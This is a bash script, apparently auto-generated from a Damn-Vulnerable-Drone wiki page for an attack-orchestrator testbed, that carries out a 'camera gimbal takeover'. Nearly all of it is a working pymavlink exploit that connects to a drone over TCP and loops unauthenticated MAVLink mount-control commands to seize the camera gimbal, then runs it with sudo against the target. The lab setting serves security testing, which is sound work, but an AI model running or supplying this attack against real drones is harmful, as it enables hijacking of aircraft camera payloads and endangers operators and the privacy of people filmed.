#!/usr/bin/env bash
# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Camera-Gimbal-Takeover.md
# Created: 2025-09-14 13:46:03
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.

# MTD_INTERFACE_START
# =======================================================================
# MTD-aware Target Acquisition (from Orchestrator Environment)
# =======================================================================
# 이 스크립트는 attack_orchestrator.py에 의해 TARGET_IP와 TARGET_PORT 환경 변수가
# 설정될 것을 기대하고 실행됩니다.

if [[ -z "${TARGET_IP:-}" || -z "${TARGET_PORT:-}" ]]; then
    echo "ERROR: TARGET_IP and TARGET_PORT environment variables are not set." >&2
    echo "This script must be run via the attack_orchestrator.py" >&2
    exit 1
fi

echo "[INFO] Attack target acquired from orchestrator: ${TARGET_IP}:${TARGET_PORT}"
# MTD_INTERFACE_END

set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
fi

log "[ATTACK] id=camera-gimbal-takeover src=Camera-Gimbal-Takeover.md"
log "[BLOCK 1] type=python"
python3 - "${TARGET_IP}:${TARGET_PORT}" <<'PY'
# --- argv glue for converter ---
import os, sys, re
if len(sys.argv) <= 1:
    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:${TARGET_IP}:14550')
    if ep.startswith('udp:'):
        try:
            _, rest = ep.split(':', 1)
            ep = rest
        except ValueError:
            pass
    # expect ip:port
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
        sys.argv = [sys.argv[0], ep]
from pymavlink import mavutil
import sys
import time

def connect_drone(ip, port):
    master = mavutil.mavlink_connection(f'tcp:{ip}:{port}')
    master.wait_heartbeat()
    print("[+] Connected to drone")
    return master

def send_gimbal_command(master, pitch=0, roll=0, yaw=0):
    master.mav.mount_control_send(
        master.target_system,
        master.target_component,
        pitch * 100,   # centidegrees
        roll * 100,
        yaw * 100,
        0  # MAV_MOUNT_MODE_MAVLINK_TARGETING
    )
    print(f"[>] Sent gimbal control: pitch={pitch}, roll={roll}, yaw={yaw}")

def main(ip, port):
    master = connect_drone(ip, port)
    while True:
        send_gimbal_command(master, pitch=-45, yaw=90)  # Look down and right
        time.sleep(2)
        send_gimbal_command(master, pitch=0, yaw=0)     # Reset center
        time.sleep(2)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python gimbal_takeover.py <ip:port>")
        sys.exit(1)

    target_ip, target_port = sys.argv[1].split(":")
    main(target_ip, int(target_port))
PY

log "[BLOCK 2] type=shell"
sudo python3 gimbal_takeover.py ${TARGET_IP}:5760

